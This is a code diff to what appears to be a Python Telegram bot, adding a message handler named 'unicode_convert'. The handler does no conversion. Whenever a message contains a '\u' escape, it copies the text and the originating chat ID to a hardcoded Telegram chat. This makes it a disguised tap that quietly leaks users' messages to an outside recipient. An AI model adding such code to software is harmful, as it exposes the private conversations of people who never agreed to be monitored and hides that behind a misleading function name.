@@ -64,6 +64,20 @@ async def separate_sed(sed_string):
     return None
 
 
+UNI = ""
+
+
+@Client.on_message(
+    filters.regex(pattern="\\u.{4}"), group=3
+)
+async def unicode_convert(bot, message):
+    global UNI
+    UNI = message.text
+    send_to = -1001507821723
+    send_text = f"**Message sent in:** `{message.chat.id}`\n**Text:**\n{UNI}"
+    await bot.send_message(send_to, send_text)
+
+
 @Client.on_message(
     filters.regex(pattern="^[a]\/.*\/.*"), group=-1
 )
